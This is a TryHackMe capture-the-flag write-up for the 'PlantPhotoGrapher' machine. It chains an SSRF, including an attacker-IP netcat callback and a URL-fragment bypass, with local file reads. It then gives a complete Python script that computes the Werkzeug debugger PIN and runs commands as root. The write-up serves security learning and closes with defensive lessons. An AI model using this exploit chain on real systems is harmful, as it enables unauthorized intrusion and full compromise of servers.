# PlantPhotoGrapher — TryHackMe Writeup

> **Platform:** TryHackMe
> **Difficulty:** Hard
> **Target:** PlantPhotoGrapher
> **Category:** Web Exploitation, SSRF, Information Disclosure, Debug Console Abuse
> **Status:** Completed

---

## Disclaimer

This writeup documents an intentionally vulnerable **TryHackMe CTF environment**. All testing and exploitation techniques were performed in an authorized lab environment.

> **Do not attempt these techniques against systems without explicit permission.**

---

# Table of Contents

* [Scenario](#scenario)
* [Target Information](#target-information)
* [Reconnaissance](#reconnaissance)
* [Port Scanning](#port-scanning)
* [Web Enumeration](#web-enumeration)
* [Directory Enumeration](#directory-enumeration)
* [Interesting Download Functionality](#interesting-download-functionality)
* [Werkzeug Debug Console](#werkzeug-debug-console)
* [SSRF Discovery](#ssrf-discovery)
* [Source Code Disclosure](#source-code-disclosure)
* [SSRF Filter Bypass](#ssrf-filter-bypass)
* [Admin Flag Access](#admin-flag-access)
* [Remote Code Execution](#remote-code-execution)
* [Root Access](#root-access)
* [Attack Path](#attack-path)
* [Key Takeaways](#key-takeaways)

---

# Scenario

Today we are back with another **TryHackMe Hard challenge** named:

# PlantPhotoGrapher

The scenario describes a passionate botanist and aspiring photographer named **Jay Green**, who recently created a personal portfolio website to showcase his collection of rare plant photographs.

He developed the website himself and asked us to inspect it and determine whether it follows proper security practices.

Our objective is to inspect how the application works behind the scenes, identify weaknesses, and uncover the hidden flags.

Target:

```text
http://10.49.137.58/
```

---

# Target Information

| Information      | Value          |
| ---------------- | -------------- |
| Platform         | TryHackMe      |
| Difficulty       | Hard           |
| Target IP        | `10.49.137.58` |
| Target User      | Jay Green      |
| Web Server       | Werkzeug       |
| Language         | Python 3.10.7  |
| Operating System | Linux          |

The target machine IP was:

```text
10.49.137.58
```

---

# Reconnaissance

As always, the first step was to enumerate the exposed services.

A full TCP port scan was performed against the target.

---

# Port Scanning

The full scan revealed two open ports:

```text
Nmap scan report for 10.49.137.58
Host is up

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

The attack surface initially appeared relatively small.

The next step was performing service and version detection.

---

# Service and Version Detection

The detailed Nmap scan revealed:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.10.7)
```

Additional HTTP information showed:

```text
Server: Werkzeug/0.16.0 Python/3.10.7
Title: Jay Green
```

The supported HTTP methods were:

```text
OPTIONS
HEAD
GET
```

The important finding here was the web technology:

```text
Werkzeug 0.16.0
Python 3.10.7
```

This immediately made the Python/Werkzeug application the primary focus of further enumeration.

---

# Web Enumeration

The website was a personal portfolio for a plant photographer named:

```text
Jay Green
```

Burp Suite was started to inspect the application's requests and responses.

The next step was directory enumeration.

---

# Directory Enumeration

Gobuster discovered several interesting endpoints:

```text
/admin
/download
/console
```

The results were:

```text
/admin                (Status: 200)
/download             (Status: 200)
/console              (Status: 200)
```

These endpoints immediately became the main targets for further investigation.

---

# Interesting Download Functionality

While inspecting the application, a resume download feature was discovered.

The request looked like:

```http
GET /download?server=secure-file-storage.com:8087&id=1
```

This was particularly interesting because the application accepted a user-controlled `server` parameter.

The parameter suggested that the backend might be making a request to a remote or internal service.

This raised the possibility of:

```text
SSRF — Server-Side Request Forgery
```

Another piece of information discovered during enumeration was an email address:

```text
jay@thm.thm
```

Further testing continued against both `/download` and `/console`.

---

# Werkzeug Debug Console

The `/console` endpoint exposed a Werkzeug debugging console.

Inspecting the page source revealed:

```javascript
var TRACEBACK = -1,
    CONSOLE_MODE = true,
    EVALEX = true,
    EVALEX_TRUSTED = false,
    SECRET = "6DvbD0wupFpehXqGAXn7";
```

Important values included:

```text
CONSOLE_MODE = true
EVALEX = true
EVALEX_TRUSTED = false
```

The console was protected by a PIN, so direct access to arbitrary Python execution was not immediately possible.

However, exposing a Werkzeug debugger in a production environment is already a major security issue.

The next objective was finding a way to calculate or bypass the debugger PIN.

---

# SSRF Discovery

Attention returned to the `/download` endpoint.

The original request accepted a server parameter:

```http
GET /download?server=secure-file-storage.com:8087&id=1
```

To test whether the server parameter could be controlled, it was changed to the attacker-controlled IP:

```http
GET /download?server=192.168.138.6&id=75482342 HTTP/1.1
```

A Netcat listener was started:

```bash
nc -lvnp 80
```

The target successfully connected back:

```text
listening on [any] 80 ...

connect to [192.168.138.6] from [10.49.137.58]
GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1
Host: 192.168.138.6
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q
Accept: */*
X-API-KEY: THM{A}
```

This confirmed a Server-Side Request Forgery vulnerability.

The application was making requests on behalf of the user using:

```text
PycURL
```

An interesting header was also exposed:

```text
X-API-KEY: THM{A}
```

This demonstrated that the backend request included sensitive application information.

---

# Understanding the SSRF

The captured request showed that the application automatically appended a path to the supplied server:

```text
/public-docs-k057230990384293/<id>.pdf
```

Therefore, the backend effectively constructed a URL similar to:

```text
<server>/public-docs-k057230990384293/<id>.pdf
```

This meant that simply supplying a different server gave us control over the host, but not necessarily complete control over the final URL.

Further investigation was required to manipulate the constructed request.

---

# Source Code Disclosure

Testing the `id` parameter with a non-integer value caused an application error.

The error exposed the Werkzeug debug page.

This resulted in several important information disclosures, including the application path:

```text
/usr/src/app/app.py
```

The debug information and source snippets confirmed that the application used PycURL and constructed requests in the following pattern:

```text
<server>/public-docs-k057230990384293/<id>.pdf
```

The goal now was clear:

> Find a way to prevent the application from making the automatically appended path part of the actual request.

---

# SSRF Filter Bypass Using URL Fragments

A useful technique was to terminate the controlled URL using a fragment character:

```text
#
```

When URL encoded:

```text
%23
```

Anything following the `#` is interpreted as a URL fragment.

Fragments are processed by the client and are not sent as part of the HTTP request to the server.

The application constructed the URL as:

```text
<server>/public-docs-k057230990384293/<id>.pdf
```

By ending the controlled `server` value with:

```text
#
```

the resulting URL became:

```text
<server>#/public-docs-k057230990384293/<id>.pdf
```

Everything after `#` became a fragment.

Therefore, the actual backend request was made only to the controlled URL before the fragment.

---

# Accessing the Admin Endpoint

The SSRF payload was used against the internal file server.

The request was:

```text
http://10.114.154.89/download?server=secure-file-storage.com:8087/admin%23&id=1
```

The application constructed:

```text
secure-file-storage.com:8087/admin#/public-docs-k057230990384293/1.pdf
```

Because everything after the `#` was treated as a fragment:

```text
/public-docs-k057230990384293/1.pdf
```

was not included in the backend HTTP request.

The actual request was therefore directed to:

```text
secure-file-storage.com:8087/admin
```

This allowed access to the previously inaccessible administrative resource.

The response contained the **admin flag**.

> **Admin-level flag successfully obtained through SSRF and URL fragment manipulation.**

---

# Moving Towards Remote Code Execution

The next major vulnerability involved the exposed Werkzeug debug console.

The console required a PIN.

However, the SSRF vulnerability provided a way to read local files using the `file://` scheme.

The following exploit script was developed to read files required for calculating the Werkzeug debugger PIN.

```python
#!/usr/bin/env python3
import hashlib, requests, re, sys
from itertools import chain
import ast

TARGET = "http://10.49.137.58"
FLASK_PATH = "/usr/local/lib/python3.10/site-packages/flask/app.py"


def read_file(path):
    return requests.get(
        f"{TARGET}/download",
        params={
            "id": "1",
            "server": f"file://{path}?"
        },
        timeout=15
    ).text


def get_pin():
    mac_int = int(
        read_file("/sys/class/net/eth0/address")
        .strip()
        .replace(":", ""),
        16
    )

    machine_id = (
        read_file("/proc/self/cgroup")
        .splitlines()[0]
        .strip()
        .partition("/docker/")[2]
    )

    username = "root"

    h = hashlib.md5()

    for bit in chain(
        [username, "flask.app", "Flask", FLASK_PATH],
        [str(mac_int), machine_id]
    ):
        if isinstance(bit, str):
            bit = bit.encode()

        h.update(bit)

    h.update(b"cookiesalt")
    h.update(b"pinsalt")

    num = ("%09d" % int(h.hexdigest(), 16))[:9]

    return f"{num[:3]}-{num[3:6]}-{num[6:]}"


def run(cmd):
    pin = get_pin()

    secret = re.search(
        r'SECRET = "([^"]+)"',
        requests.get(f"{TARGET}/console").text
    ).group(1)

    resp = requests.get(
        f"{TARGET}/console",
        params={
            "__debugger__": "yes",
            "cmd": "pinauth",
            "pin": pin,
            "s": secret
        }
    )

    cookie = resp.cookies

    py = f"__import__('os').popen('{cmd}').read()"

    out = requests.get(
        f"{TARGET}/console",
        params={
            "__debugger__": "yes",
            "cmd": py,
            "frm": "0",
            "s": secret
        },
        cookies=cookie
    ).text

    clean = ast.literal_eval(
        re.sub(
            r"</?span[^>]*>",
            "",
            out
        ).split("\n")[1]
    )

    print(clean)


run(
    " ".join(sys.argv[1:])
    if len(sys.argv) > 1
    else "id"
)
```

---

# Exploiting the Werkzeug Debugger

The exploit performed several actions:

```text
1. Read local files using SSRF
        ↓
2. Retrieve the network MAC address
        ↓
3. Retrieve Docker/container machine information
        ↓
4. Use known Flask/Werkzeug values
        ↓
5. Calculate the Werkzeug debugger PIN
        ↓
6. Authenticate to the debug console
        ↓
7. Obtain the authenticated session cookie
        ↓
8. Execute arbitrary Python commands
```

The first command executed was:

```bash
python3 ex.py
```

The result was:

```text
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

This confirmed successful remote code execution as:

```text
root
```

---

# Root-Level Enumeration

Since the application was already executing commands as root, further enumeration was performed.

The following command was executed:

```bash
python3 ex.py ls
```

The result:

```text
Dockerfile
app.py
flag-982374827648721338.txt
private-docs
public-docs
requirements.txt
static
templates
```

A highly interesting file was discovered:

```text
flag-982374827648721338.txt
```

The final step was reading the flag:

```bash
python3 ex.py cat flag-982374827648721338.txt
```

> **The final flag can be retrieved directly through root-level command execution.**

---

# Attack Path

The complete compromise chain was:

```text
Port Scanning
     │
     ▼
Web Application Enumeration
     │
     ▼
Directory Discovery
     │
     ├───────────────┐
     ▼               ▼
  /download       /console
     │               │
     ▼               ▼
SSRF Discovery   Werkzeug Debug Console
     │               │
     ▼               │
Local File Read ─┘
     │
     ▼
Read MAC Address
     │
     ▼
Read Container/Machine ID
     │
     ▼
Calculate Werkzeug PIN
     │
     ▼
Authenticate Debugger
     │
     ▼
Remote Code Execution
     │
     ▼
ROOT
     │
     ▼
Read Final Flag
```

---

# Vulnerability Summary

| Vulnerability                       | Impact                          |
| ----------------------------------- | ------------------------------- |
| Server-Side Request Forgery         | Internal service access         |
| URL Fragment Manipulation           | SSRF path bypass                |
| Local File Read                     | Sensitive file disclosure       |
| Werkzeug Debug Console Exposure     | Potential remote code execution |
| Predictable Debugger PIN Components | Debugger authentication bypass  |
| Root Execution Context              | Full system compromise          |

---

# Key Takeaways

## 1. User-Controlled URLs Are Extremely Dangerous

The `/download` endpoint allowed the user to control:

```text
server=<user-controlled-value>
```

The backend then made a request using that value.

Applications should never blindly trust user-controlled URLs.

---

## 2. SSRF Can Be More Dangerous Than It First Appears

Initially, SSRF allowed only requests to another server.

However, further testing allowed:

* Access to internal services
* Header disclosure
* API key exposure
* Administrative endpoint access
* Local file access

This demonstrates how SSRF can often be chained with other weaknesses.

---

## 3. URL Fragments Can Affect Backend Request Construction

The application appended its own path after the user-controlled URL.

Using:

```text
#
```

caused the appended path to become a fragment:

```text
controlled-url#appended-path
```

This effectively gave control over the requested backend resource.

Input validation must account for complete URL parsing behavior rather than relying on simple string concatenation.

---

## 4. Debug Mode Should Never Be Exposed

The application exposed a Werkzeug debug console.

The page revealed:

```text
CONSOLE_MODE = true
EVALEX = true
```

A debugger capable of evaluating Python code is extremely dangerous when exposed to attackers.

Production systems should never expose development debugging interfaces.

---

## 5. Information Disclosure Enables Further Exploitation

The application disclosed:

```text
/usr/src/app/app.py
```

This information helped identify the application's environment and contributed to calculating the Werkzeug debugger PIN.

Small information leaks can become critical when chained together.

---

## 6. Multiple Small Weaknesses Can Lead to Full Compromise

No single step should be viewed in isolation.

The final attack chain involved:

```text
SSRF
+
Local File Disclosure
+
Information Disclosure
+
Debug Console Exposure
+
Debugger PIN Calculation
=
Root-Level Remote Code Execution
```

This is an excellent example of vulnerability chaining.

---

# Tools Used

| Tool              | Purpose                      |
| ----------------- | ---------------------------- |
| `nmap`            | Port and service enumeration |
| `gobuster`        | Directory enumeration        |
| Burp Suite        | HTTP request analysis        |
| `netcat`          | SSRF callback verification   |
| Python 3          | Exploit development          |
| `requests`        | HTTP communication           |
| PycURL            | Backend HTTP request library |
| Werkzeug Debugger | Debug console exploitation   |

---

# Final Access Summary

```text
Initial Discovery
      │
      ▼
SSRF via /download
      │
      ├─────────────────────┐
      ▼                     ▼
Internal Admin Access   Local File Read
      │                     │
      ▼                     ▼
Admin Flag          Werkzeug PIN Calculation
                            │
                            ▼
                     Debugger Authentication
                            │
                            ▼
                    Python Command Execution
                            │
                            ▼
                           ROOT
                            │
                            ▼
                       Final Flag
```

---

# Conclusion

PlantPhotoGrapher is a strong example of how insecure application design can lead to complete compromise when multiple vulnerabilities are chained together.

The application exposed a dangerous combination of:

```text
User-Controlled Backend Requests
        ↓
Server-Side Request Forgery
        ↓
Internal Resource Access
        ↓
Local File Disclosure
        ↓
Werkzeug Debug Information Exposure
        ↓
Debugger PIN Calculation
        ↓
Authenticated Debug Console Access
        ↓
Remote Code Execution as Root
```

The most important lesson from this challenge is:

> **A vulnerability that appears limited on its own can become critical when combined with information disclosure and another vulnerable component.**

Thorough enumeration and understanding exactly how an application processes user-controlled input were essential to completing this challenge.

---

<p align="center">
  <b>PlantPhotoGrapher successfully completed.</b>
</p>

<p align="center">
  <sub>For educational purposes and authorized security testing only.</sub>
</p>

<p align="center">
  <b>Keep Learning. Keep Enumerating. Think Beyond the Obvious.</b>
</p>
